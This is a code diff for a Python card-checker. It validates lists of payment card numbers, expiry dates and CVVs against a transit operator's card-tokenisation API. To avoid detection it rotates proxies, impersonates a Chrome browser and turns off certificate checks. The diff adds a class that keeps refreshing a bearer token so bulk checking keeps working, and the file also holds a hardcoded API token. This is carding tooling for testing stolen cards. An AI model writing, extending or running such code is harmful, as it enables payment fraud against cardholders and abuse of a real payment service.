@@ -231,7 +231,8 @@ def verify_key():
     return jsonify({"success": True, "expires_ts": expires_ts})
 
 TOKENISATION_BASE = "https://web.uk.littlepay.com"
-INLINE_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"
+PARTICIPANT_ID = "coast-rta"
+FALLBACK_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"
 
 class WebProxyPool:
     def __init__(self, raw_proxies):
@@ -255,6 +256,37 @@ class WebProxyPool:
                 p = f"http://{u}:{safe_pw}@{h}:{po}"
         return {"http": p, "https": p}
 
+class DynamicTokenManager:
+    def __init__(self, initial_token, proxy_pool):
+        self.token = initial_token
+        self.proxy_pool = proxy_pool
+        self.lock = threading.Lock()
+
+    def get_token(self):
+        with self.lock:
+            url = f"{TOKENISATION_BASE}/api/v1/customer/tokens/request-token"
+            headers = {
+                "Authorization": f"Bearer {self.token}",
+                "Content-Type": "application/json;charset=UTF-8",
+                "Accept": "application/json, text/plain, */*",
+                "Origin": "https://coastrta.littlepay.com",
+                "Referer": "https://coastrta.littlepay.com/"
+            }
+            body = {"request_access": "CARD_TOKENISATION", "external_participant_id": PARTICIPANT_ID}
+            p_dict = self.proxy_pool.next() if self.proxy_pool else None
+            proxy_str = p_dict["http"] if p_dict else None
+            try:
+                session = cffi_requests.Session(impersonate="chrome")
+                resp = session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    new_token = data.get("access_token")
+                    if new_token:
+                        self.token = new_token
+            except Exception:
+                pass
+            return self.token
+
 def test_proxy(proxy_dict):
     try:
         r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
@@ -262,7 +294,7 @@ def test_proxy(proxy_dict):
     except Exception:
         return False
 
-def check_single_card(card_line, proxy_pool):
+def check_single_card(card_line, proxy_pool, token_manager):
     parts = card_line.split("|")
     if len(parts) < 3:
         return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
@@ -276,8 +308,11 @@ def check_single_card(card_line, proxy_pool):
     p_dict = proxy_pool.next() if proxy_pool else None
     proxy_str = p_dict["http"] if p_dict else None
 
+    # Get dynamic token
+    current_token = token_manager.get_token()
+
     headers = {
-        "Authorization": f"Bearer {INLINE_BEARER_TOKEN}",
+        "Authorization": f"Bearer {current_token}",
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9",
         "Origin": "https://coastrta.littlepay.com",
@@ -387,6 +422,7 @@ def background_worker(cards, proxies_list):
         proxy_pool = None
         checker_queue.put({"status_msg": "Running proxyless mode."})
 
+    token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
     counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
 
     for card in cards:
@@ -401,7 +437,7 @@ def background_worker(cards, proxies_list):
             counts["error"] += 1
             continue
 
-        code, status, detail = check_single_card(card, proxy_pool)
+        code, status, detail = check_single_card(card, proxy_pool, token_manager)
         counts["checked"] += 1
         if code == 0: counts["live"] += 1
         elif code == 1: counts["dead"] += 1
